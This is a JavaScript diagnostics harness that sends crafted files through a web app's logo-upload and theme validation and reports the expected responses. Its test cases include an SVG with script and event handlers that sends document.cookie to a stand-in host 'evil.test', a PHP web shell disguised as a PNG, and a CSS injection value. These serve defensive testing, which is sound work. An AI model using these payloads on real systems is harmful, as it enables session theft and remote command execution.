/* ============================================================================
   Upload tests — a diagnostics harness, not a product feature.

   Each button builds a real file in memory and sends it through the same
   validation path a genuine upload takes, so the rejections below are produced
   by the code that runs in production, not by a mock.
   ========================================================================== */

let CRCT = null;
/** CRC32, needed to build a genuinely valid PNG rather than a stub. */
function crc32(bytes){
  if(!CRCT){
    CRCT = new Int32Array(256);
    for(let n = 0; n < 256; n++){
      let c = n;
      for(let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
      CRCT[n] = c;
    }
  }
  let c = 0xffffffff;
  for(let i = 0; i < bytes.length; i++) c = CRCT[(c ^ bytes[i]) & 0xff] ^ (c >>> 8);
  return (c ^ 0xffffffff) >>> 0;
}
function adler32(d){
  let a = 1, b = 0;
  for(let i = 0; i < d.length; i++){ a = (a + d[i]) % 65521; b = (b + a) % 65521; }
  return (b << 16 | a) >>> 0;
}
/** Builds a 1x1 PNG with a stored (uncompressed) zlib stream — valid, no deflate needed. */
function makePng(r, g, b){
  const cat = (...a) => {
    const t = new Uint8Array(a.reduce((n, x) => n + x.length, 0));
    let o = 0;
    for(const x of a){ t.set(x, o); o += x.length; }
    return t;
  };
  const u32 = n => new Uint8Array([n >>> 24 & 255, n >>> 16 & 255, n >>> 8 & 255, n & 255]);
  const chunk = (type, data) => {
    const body = cat(new TextEncoder().encode(type), data);
    return cat(u32(data.length), body, u32(crc32(body)));
  };
  const ihdr = new Uint8Array(13);
  ihdr.set(u32(1), 0); ihdr.set(u32(1), 4);
  ihdr[8] = 8; ihdr[9] = 2;
  const raw = new Uint8Array([0, r, g, b]);
  const len = raw.length;
  const z = cat(new Uint8Array([0x78, 0x01, 0x01, len & 255, len >> 8 & 255, ~len & 255, (~len >> 8) & 255]),
                raw, u32(adler32(raw)));
  return cat(new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
             chunk('IHDR', ihdr), chunk('IDAT', z), chunk('IEND', new Uint8Array(0)));
}
const mkFile = (bytes, name, type) => new File([bytes], name, { type });
const enc = s => new TextEncoder().encode(s);

const UPLOAD_CASES = [
  { id:'ok-png',  label:'Valid PNG logo',
    note:'Expected 201 — stored under a content-hash filename',
    make:() => mkFile(makePng(30, 90, 120), 'brand.png', 'image/png') },
  { id:'ok-png2', label:'A different PNG',
    note:'Expected 201 — replaces the previous file, which is then deleted',
    make:() => mkFile(makePng(168, 68, 42), 'brand-red.png', 'image/png') },
  { id:'dupe',    label:'The same PNG again',
    note:'Expected 201 with deduplicated — no second file written',
    make:() => mkFile(makePng(30, 90, 120), 'copy-of-brand.png', 'image/png') },
  { id:'svg-ok',  label:'Clean SVG',
    note:'Expected 201 — markup preserved',
    make:() => mkFile(enc('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 40"><rect width="120" height="40" rx="4" fill="#1e5a78"/><text x="12" y="26" fill="#fff" font-family="sans-serif" font-size="16">ACME</text></svg>'), 'logo.svg', 'image/svg+xml') },
  { id:'svg-xss', label:'SVG carrying a script and an onload handler',
    note:'Expected 201 — accepted, but the active content is stripped before storage',
    make:() => mkFile(enc('<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 40" onload="alert(document.cookie)"><script>fetch("//evil.test/"+document.cookie)<\/script><a href="javascript:alert(1)"><rect width="120" height="40" rx="4" fill="#a8442a"/></a><foreignObject><img src=x onerror=alert(2)></foreignObject><text x="16" y="26" fill="#fff" font-family="sans-serif" font-size="15">XSS</text></svg>'), 'evil.svg', 'image/svg+xml') },
  { id:'php',     label:'PHP shell renamed .png, mimetype forged',
    note:'Expected 415 — rejected on magic bytes, never reaches storage',
    make:() => mkFile(enc('<?php system($_GET["c"]); ?>' + 'A'.repeat(60)), 'logo.png', 'image/png') },
  { id:'gif',     label:'GIF file',
    note:'Expected 415 — not an accepted format',
    make:() => mkFile(enc('GIF89a' + 'x'.repeat(40)), 'anim.gif', 'image/gif') },
  { id:'trunc',   label:'Truncated PNG',
    note:'Expected 422 — no IEND chunk, treated as corrupt',
    make:() => mkFile(makePng(0, 0, 0).subarray(0, 28), 'cut.png', 'image/png') },
  { id:'empty',   label:'Empty file',
    note:'Expected 422',
    make:() => mkFile(new Uint8Array(0), 'nothing.png', 'image/png') },
  { id:'big',     label:'PNG larger than 2 MB',
    note:'Expected 413',
    make:() => mkFile(new Uint8Array(2 * 1024 * 1024 + 64), 'huge.png', 'image/png') }
];

const THEME_CASES = {
  css:     { label:'CSS injection in font-family', payload:{ fontFamily:'system; background:url(//evil.test/steal)' },
             note:'Sends a value that would close the CSS declaration — expected 422' },
  hex:     { label:'Invalid colour',   payload:{ primaryColor:'blue' },
             note:'Named colours are not hex — expected 422 with a field error' },
  size:    { label:'Font size 99',     payload:{ fontSize:99 },
             note:'Outside the 12–32 range — expected 422' },
  partial: { label:'Partial update',   payload:{ textColor:'#7a1f1f' },
             note:'Sends only textColor — the other fields must survive' }
};

function vUploadTests(v){
  if(guard(v)) return;
  v.innerHTML = `
  <div class="tcols">
    <div>
      <div class="card">
        <header><h2>Send a crafted file</h2></header>
        <div class="in">
          <p class="note" style="margin-bottom:12px">This page is a diagnostics harness rather than a feature an administrator would normally see. Each button builds a real file in memory and pushes it through the same checks the upload endpoint runs: mimetype filter, magic-byte sniffing, structural completeness, SVG sanitisation, content hashing. Successful uploads change the logo across the whole register.</p>
          <div class="tests">
            ${UPLOAD_CASES.map(c => `<button class="btn" data-case="${c.id}"><strong>${esc(c.label)}</strong><br><span style="color:var(--muted)">${esc(c.note)}</span></button>`).join('')}
          </div>
        </div>
      </div>
      <div class="card" style="margin-top:14px">
        <header><h2>Theme validation</h2></header>
        <div class="in"><div class="tests">
          ${Object.entries(THEME_CASES).map(([k, c]) => `<button class="btn" data-tcase="${k}"><strong>${esc(c.label)}</strong><br><span style="color:var(--muted)">${esc(c.note)}</span></button>`).join('')}
        </div></div>
      </div>
    </div>

    <div class="tsticky">
      <div class="card">
        <header><h2>Results</h2>${TRESULTS.length ? '<button class="btn sm" id="tclr" style="margin-left:auto">Clear</button>' : ''}</header>
        <div class="in" id="tres">
          ${TRESULTS.length ? TRESULTS.map(r => `
            <div style="border-bottom:1px solid var(--line2);padding:9px 0">
              <div class="row" style="gap:8px;align-items:baseline">
                <span class="mono" style="color:${r.status < 300 ? 'var(--moss)' : 'var(--oxide)'};font-weight:500">${r.status}</span>
                <strong style="font-size:13px">${esc(r.label)}</strong>
              </div>
              <div style="color:var(--muted);font-size:12.5px;margin-top:3px">${esc(r.detail)}</div>
              ${r.extra ? `<div class="mono" style="font-size:11.5px;margin-top:4px;color:var(--muted);word-break:break-all">${esc(r.extra)}</div>` : ''}
            </div>`).join('') : '<p class="note">No tests run yet.</p>'}
        </div>
      </div>
      <div class="card" style="margin-top:14px">
        <header><h2>Request log</h2></header>
        <div class="in"><div class="rlog" id="rlog">${renderRlog()}</div></div>
      </div>
    </div>
  </div>`;

  v.querySelectorAll('[data-case]').forEach(b => b.onclick = () => runUploadCase(b.dataset.case));
  v.querySelectorAll('[data-tcase]').forEach(b => b.onclick = () => runThemeCase(b.dataset.tcase));
  const c = document.getElementById('tclr');
  if(c) c.onclick = () => { TRESULTS = []; render(); };
}

function pushResult(r){
  TRESULTS.unshift(r);
  if(TRESULTS.length > 20) TRESULTS.length = 20;
}

async function runUploadCase(id){
  const c = UPLOAD_CASES.find(x => x.id === id);
  try{
    const res = await TAPI.postLogo(c.make());
    let detail = res.deduplicated
      ? 'Accepted — those exact bytes were already stored, so no second file was written.'
      : 'Accepted and stored.';
    if(res.replaced && !res.deduplicated) detail += ' The previous file was deleted after the settings commit.';
    if(res.sanitizedBytes > 0) detail += ` ${res.sanitizedBytes} bytes of active content were stripped.`;
    pushResult({ status:201, label:c.label, detail, extra:res.logo.filename });
  }catch(err){
    if(handleAuthLoss(err))return;
    pushResult({ status:err.status || 500, label:c.label, detail:err.message, extra:err.code });
  }
  render();
}

async function runThemeCase(kind){
  const c = THEME_CASES[kind];
  try{
    const res = await TAPI.putTheme(c.payload);
    S.theme = res.theme; TDRAFT = { ...res.theme }; TSAVED = { ...res.theme };
    applyTheme(res.theme);
    pushResult({ status:200, label:c.label,
      detail:'Accepted. The fields the payload omitted kept their stored values.',
      extra:`primaryColor=${res.theme.primaryColor} fontFamily=${res.theme.fontFamily} fontSize=${res.theme.fontSize}` });
  }catch(err){
    pushResult({ status:err.status || 500, label:c.label, detail:err.message,
      extra: err.fields ? Object.entries(err.fields).map(([k, v]) => `${k}: ${v}`).join(' | ') : err.code });
  }
  render();
}
